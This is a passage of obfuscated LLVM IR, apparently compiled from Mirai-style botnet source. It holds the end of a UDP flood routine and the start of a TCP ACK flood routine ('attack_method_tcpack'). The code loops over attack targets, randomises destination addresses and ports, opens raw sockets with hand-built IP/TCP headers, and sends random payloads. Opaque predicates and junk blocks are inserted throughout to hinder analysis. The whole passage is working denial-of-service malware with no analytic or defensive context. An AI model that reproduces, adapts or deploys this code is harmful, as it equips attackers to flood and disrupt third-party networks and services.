; <label>:73:                                     ; preds = %70, %67
  store i32 0, i32* %17, align 4
  br label %74

; <label>:74:                                     ; preds = %originalBBpart227, %73
  %75 = load i32, i32* %17, align 4
  %76 = load i8, i8* %13, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp slt i32 %75, %77
  br i1 %78, label %79, label %253

; <label>:79:                                     ; preds = %74
  %80 = load i32, i32* @x.25
  %81 = load i32, i32* @y.26
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %79
  %88 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %89 = load i8**, i8*** %18, align 8
  %90 = load i32, i32* %17, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8*, i8** %89, i64 %91
  store i8* %88, i8** %92, align 8
  %93 = load i16, i16* %20, align 2
  %94 = zext i16 %93 to i32
  %95 = icmp eq i32 %94, 65535
  %96 = load i32, i32* @x.25
  %97 = load i32, i32* @y.26
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %95, label %104, label %113

; <label>:104:                                    ; preds = %originalBBpart24
  %105 = call i32 @rand_next()
  %106 = trunc i32 %105 to i16
  %107 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %108 = load i32, i32* %17, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 1
  store i16 %106, i16* %112, align 2
  br label %122

; <label>:113:                                    ; preds = %originalBBpart24
  %114 = load i16, i16* %20, align 2
  %115 = call zeroext i16 @htons(i16 zeroext %114) #8
  %116 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %117 = load i32, i32* %17, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i64 %118
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i32 0, i32 0
  %121 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %120, i32 0, i32 1
  store i16 %115, i16* %121, align 2
  br label %122

; <label>:122:                                    ; preds = %113, %104
  %123 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %124 = load i32*, i32** %19, align 8
  %125 = load i32, i32* %17, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %124, i64 %126
  store i32 %123, i32* %127, align 4
  %128 = icmp eq i32 %123, -1
  br i1 %128, label %129, label %130

; <label>:129:                                    ; preds = %122
  ret void

; <label>:130:                                    ; preds = %122
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load i16, i16* %21, align 2
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %132, i16* %133, align 2
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %135 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %134, i32 0, i32 0
  store i32 0, i32* %135, align 4
  %136 = load i32*, i32** %19, align 8
  %137 = load i32, i32* %17, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i32, i32* %136, i64 %138
  %140 = load i32, i32* %139, align 4
  %141 = bitcast %union.__CONST_SOCKADDR_ARG* %28 to %struct.sockaddr**
  %142 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  store %struct.sockaddr* %142, %struct.sockaddr** %141, align 8
  %143 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %28, i32 0, i32 0
  %144 = load %struct.sockaddr*, %struct.sockaddr** %143, align 8
  %145 = call i32 @bind(i32 %140, %struct.sockaddr* %144, i32 16) #7
  %146 = icmp eq i32 %145, -1
  br i1 %146, label %147, label %148

; <label>:147:                                    ; preds = %130
  br label %148

; <label>:148:                                    ; preds = %147, %130
  %149 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %150 = load i32, i32* %17, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = icmp slt i32 %155, 32
  br i1 %156, label %157, label %199

; <label>:157:                                    ; preds = %148
  %158 = load i32, i32* @x.25
  %159 = load i32, i32* @y.26
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %157
  %166 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %167 = load i32, i32* %17, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = call i32 @ntohl(i32 %171) #8
  %173 = call i32 @rand_next()
  %174 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %175 = load i32, i32* %17, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %176
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i32 0, i32 2
  %179 = load i8, i8* %178, align 4
  %180 = zext i8 %179 to i32
  %181 = lshr i32 %173, %180
  %182 = add i32 %172, %181
  %183 = call i32 @htonl(i32 %182) #8
  %184 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %185 = load i32, i32* %17, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 0
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %188, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %183, i32* %190, align 4
  %191 = load i32, i32* @x.25
  %192 = load i32, i32* @y.26
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br label %199

; <label>:199:                                    ; preds = %originalBBpart216, %148
  %200 = load i32*, i32** %19, align 8
  %201 = load i32, i32* %17, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i32, i32* %200, i64 %202
  %204 = load i32, i32* %203, align 4
  %205 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %206 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %207 = load i32, i32* %17, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 0
  %211 = bitcast %struct.sockaddr_in* %210 to %struct.sockaddr*
  store %struct.sockaddr* %211, %struct.sockaddr** %205, align 8
  %212 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %213 = load %struct.sockaddr*, %struct.sockaddr** %212, align 8
  %214 = call i32 @connect(i32 %204, %struct.sockaddr* %213, i32 16)
  %215 = icmp eq i32 %214, -1
  br i1 %215, label %216, label %217

; <label>:216:                                    ; preds = %199
  br label %217

; <label>:217:                                    ; preds = %216, %199
  %218 = load i32, i32* @x.25
  %219 = load i32, i32* @y.26
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %217
  %226 = load i32, i32* @x.25
  %227 = load i32, i32* @y.26
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %234

; <label>:234:                                    ; preds = %originalBBpart220
  %235 = load i32, i32* @x.25
  %236 = load i32, i32* @y.26
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %234
  %243 = load i32, i32* %17, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %17, align 4
  %245 = load i32, i32* @x.25
  %246 = load i32, i32* @y.26
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart227, label %originalBB22alteredBB

originalBBpart227:                                ; preds = %originalBB22
  br label %74

; <label>:253:                                    ; preds = %74
  br label %254

; <label>:254:                                    ; preds = %333, %253
  store i32 0, i32* %17, align 4
  br label %255

; <label>:255:                                    ; preds = %330, %254
  %256 = load i32, i32* @x.25
  %257 = load i32, i32* @y.26
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %255
  %264 = load i32, i32* %17, align 4
  %265 = load i8, i8* %13, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp slt i32 %264, %266
  %268 = load i32, i32* @x.25
  %269 = load i32, i32* @y.26
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %267, label %276, label %333

; <label>:276:                                    ; preds = %originalBBpart231
  %277 = load i8**, i8*** %18, align 8
  %278 = load i32, i32* %17, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds i8*, i8** %277, i64 %279
  %281 = load i8*, i8** %280, align 8
  store i8* %281, i8** %30, align 8
  %282 = load i8, i8* %23, align 1
  %283 = icmp ne i8 %282, 0
  br i1 %283, label %284, label %304

; <label>:284:                                    ; preds = %276
  %285 = load i32, i32* @x.25
  %286 = load i32, i32* @y.26
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %284
  %293 = load i8*, i8** %30, align 8
  %294 = load i16, i16* %22, align 2
  %295 = zext i16 %294 to i32
  call void @rand_str(i8* %293, i32 %295)
  %296 = load i32, i32* @x.25
  %297 = load i32, i32* @y.26
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %304

; <label>:304:                                    ; preds = %originalBBpart235, %276
  %305 = load i32, i32* @x.25
  %306 = load i32, i32* @y.26
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %304
  %313 = load i32*, i32** %19, align 8
  %314 = load i32, i32* %17, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds i32, i32* %313, i64 %315
  %317 = load i32, i32* %316, align 4
  %318 = load i8*, i8** %30, align 8
  %319 = load i16, i16* %22, align 2
  %320 = zext i16 %319 to i64
  %321 = call i64 @send(i32 %317, i8* %318, i64 %320, i32 16384)
  %322 = load i32, i32* @x.25
  %323 = load i32, i32* @y.26
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %330

; <label>:330:                                    ; preds = %originalBBpart239
  %331 = load i32, i32* %17, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %17, align 4
  br label %255

; <label>:333:                                    ; preds = %originalBBpart231
  br label %254

originalBBalteredBB:                              ; preds = %originalBB, %4
  %334 = alloca i8, align 1
  %335 = alloca %struct.attack_target*, align 8
  %336 = alloca i8, align 1
  %337 = alloca %struct.attack_option*, align 8
  %338 = alloca i32, align 4
  %339 = alloca i8**, align 8
  %340 = alloca i32*, align 8
  %341 = alloca i16, align 2
  %342 = alloca i16, align 2
  %343 = alloca i16, align 2
  %344 = alloca i8, align 1
  %345 = alloca %struct.sockaddr_in, align 4
  %346 = alloca %struct.iphdr*, align 8
  %347 = alloca %struct.udphdr*, align 8
  %348 = alloca i8*, align 8
  %349 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %350 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %351 = alloca i8*, align 8
  store i8 %0, i8* %334, align 1
  store %struct.attack_target* %1, %struct.attack_target** %335, align 8
  store i8 %2, i8* %336, align 1
  store %struct.attack_option* %3, %struct.attack_option** %337, align 8
  %352 = load i8, i8* %334, align 1
  %353 = zext i8 %352 to i64
  %354 = call noalias i8* @calloc(i64 %353, i64 8) #7
  %355 = bitcast i8* %354 to i8**
  store i8** %355, i8*** %339, align 8
  %356 = load i8, i8* %334, align 1
  %357 = zext i8 %356 to i64
  %358 = call noalias i8* @calloc(i64 %357, i64 4) #7
  %359 = bitcast i8* %358 to i32*
  store i32* %359, i32** %340, align 8
  %360 = load i8, i8* %336, align 1
  %361 = load %struct.attack_option*, %struct.attack_option** %337, align 8
  %362 = call i32 @attack_get_opt_int(i8 zeroext %360, %struct.attack_option* %361, i8 zeroext 7, i32 65535)
  %363 = trunc i32 %362 to i16
  store i16 %363, i16* %341, align 2
  %364 = load i8, i8* %336, align 1
  %365 = load %struct.attack_option*, %struct.attack_option** %337, align 8
  %366 = call i32 @attack_get_opt_int(i8 zeroext %364, %struct.attack_option* %365, i8 zeroext 6, i32 65535)
  %367 = trunc i32 %366 to i16
  store i16 %367, i16* %342, align 2
  %368 = load i8, i8* %336, align 1
  %369 = load %struct.attack_option*, %struct.attack_option** %337, align 8
  %370 = call i32 @attack_get_opt_int(i8 zeroext %368, %struct.attack_option* %369, i8 zeroext 0, i32 1024)
  %371 = trunc i32 %370 to i16
  store i16 %371, i16* %343, align 2
  %372 = load i8, i8* %336, align 1
  %373 = load %struct.attack_option*, %struct.attack_option** %337, align 8
  %374 = call i32 @attack_get_opt_int(i8 zeroext %372, %struct.attack_option* %373, i8 zeroext 1, i32 1)
  %375 = trunc i32 %374 to i8
  store i8 %375, i8* %344, align 1
  %376 = bitcast %struct.sockaddr_in* %345 to i8*
  call void @llvm.memset.p0i8.i64(i8* %376, i8 0, i64 16, i32 4, i1 false)
  %377 = load i16, i16* %342, align 2
  %378 = zext i16 %377 to i32
  %379 = icmp eq i32 %378, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %79
  %380 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %381 = load i8**, i8*** %18, align 8
  %382 = load i32, i32* %17, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds i8*, i8** %381, i64 %383
  store i8* %380, i8** %384, align 8
  %385 = load i16, i16* %20, align 2
  %386 = zext i16 %385 to i32
  %387 = icmp eq i32 %386, 65535
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %157
  %388 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %389 = load i32, i32* %17, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %388, i64 %390
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i32 0, i32 1
  %393 = load i32, i32* %392, align 4
  %394 = call i32 @ntohl(i32 %393) #8
  %395 = call i32 @rand_next()
  %396 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %397 = load i32, i32* %17, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %396, i64 %398
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %399, i32 0, i32 2
  %401 = load i8, i8* %400, align 4
  %402 = zext i8 %401 to i32
  %_ = sub i32 0, %395
  %gen = add i32 %_, %402
  %403 = lshr i32 %395, %402
  %_7 = sub i32 0, %394
  %gen8 = add i32 %_7, %403
  %_9 = shl i32 %394, %403
  %_10 = sub i32 0, %394
  %gen11 = add i32 %_10, %403
  %_12 = shl i32 %394, %403
  %_13 = sub i32 %394, %403
  %gen14 = mul i32 %_13, %403
  %404 = add i32 %394, %403
  %405 = call i32 @htonl(i32 %404) #8
  %406 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %407 = load i32, i32* %17, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 0
  %411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %410, i32 0, i32 2
  %412 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %411, i32 0, i32 0
  store i32 %405, i32* %412, align 4
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %217
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %234
  %413 = load i32, i32* %17, align 4
  %_23 = sub i32 0, %413
  %gen24 = add i32 %_23, 1
  %_25 = shl i32 %413, 1
  %414 = add nsw i32 %413, 1
  store i32 %414, i32* %17, align 4
  br label %originalBB22

originalBB29alteredBB:                            ; preds = %originalBB29, %255
  %415 = load i32, i32* %17, align 4
  %416 = load i8, i8* %13, align 1
  %417 = zext i8 %416 to i32
  %418 = icmp slt i32 %415, %417
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %284
  %419 = load i8*, i8** %30, align 8
  %420 = load i16, i16* %22, align 2
  %421 = zext i16 %420 to i32
  call void @rand_str(i8* %419, i32 %421)
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %304
  %422 = load i32*, i32** %19, align 8
  %423 = load i32, i32* %17, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds i32, i32* %422, i64 %424
  %426 = load i32, i32* %425, align 4
  %427 = load i8*, i8** %30, align 8
  %428 = load i16, i16* %22, align 2
  %429 = zext i16 %428 to i64
  %430 = call i64 @send(i32 %426, i8* %427, i64 %429, i32 16384)
  br label %originalBB37
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #7
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %568

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #7
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %568

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %309, %117
  %119 = load i32, i32* @x.27
  %120 = load i32, i32* @y.28
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %118
  %127 = load i32, i32* %9, align 4
  %128 = load i8, i8* %5, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp slt i32 %127, %129
  %131 = load i32, i32* @x.27
  %132 = load i32, i32* @y.28
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %130, label %139, label %312

; <label>:139:                                    ; preds = %originalBBpart2
  %140 = call noalias i8* @calloc(i64 1510, i64 1) #7
  %141 = load i8**, i8*** %11, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8*, i8** %141, i64 %143
  store i8* %140, i8** %144, align 8
  %145 = load i8**, i8*** %11, align 8
  %146 = load i32, i32* %9, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8*, i8** %145, i64 %147
  %149 = load i8*, i8** %148, align 8
  %150 = bitcast i8* %149 to %struct.iphdr*
  store %struct.iphdr* %150, %struct.iphdr** %29, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i64 1
  %153 = bitcast %struct.iphdr* %152 to %struct.tcphdr*
  store %struct.tcphdr* %153, %struct.tcphdr** %30, align 8
  %154 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i64 1
  %156 = bitcast %struct.tcphdr* %155 to i8*
  store i8* %156, i8** %31, align 8
